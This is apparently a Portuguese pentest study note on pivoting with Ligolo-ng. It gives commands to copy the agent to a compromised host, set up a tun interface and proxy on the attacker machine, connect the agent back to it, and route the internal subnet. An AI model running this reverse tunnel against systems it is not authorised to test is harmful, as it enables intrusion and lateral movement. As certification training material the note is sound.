> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/pivoting-tunneling-and-port-forwarding/ligolo-ng.md).

# Ligolo-ng

**Ligolo-ng** é uma ferramenta *simples* , *leve* e *rápida* que permite aos pentesters estabelecer túneis a partir de uma conexão TCP/TLS reversa usando uma **interface tun** (sem a necessidade de SOCKS).

* Fazer o download e descompactar as duas ferramentas

**./proxy:** O proxy permanece e é executado em sua máquina Kali local. Sua função principal é servir como ponto central onde as conexões das máquinas comprometidas são recebidas.

**./agente:** O componente agente do Ligolo é transferido para a máquina alvo, que neste contexto é a Máquina Comprometida. Depois que o agente for implantado com sucesso na máquina comprometida, você poderá executar os comandos do Ligolo junto com ele.

* Download

{% embed url="<https://github.com/nicocha30/ligolo-ng/releases>" %}

```sh
tar xzvf ligolo-ng_agent_0.5.2_linux_amd64.tar.gz
```

* Transferir o agent para a máquina do alvo

```sh
scp agent srvadm@10.129.61.241:/home/srvadm
```

* Criar uma interface do ligolo na nossa máquina

{% code lineNumbers="true" %}

```sh
sudo ip tuntap add user htb-ac-953321 mode tun ligolo
sudo ip link set ligolo up 
ip addr show ligolo
```

{% endcode %}

* Iniciar o ligolo na maquina do atacante

```haskell
./proxy --selfcert
```

* Executar o ligolo na maquina comprometida

```sh
./agent -ignore-cert -connect 0.0.0.0:11601
```

* Vamos adicionar esta sub-rede à nossa tabela de roteamento:

```haskell
sudo ip route add 0.0.0.0/24 dev ligolo
```
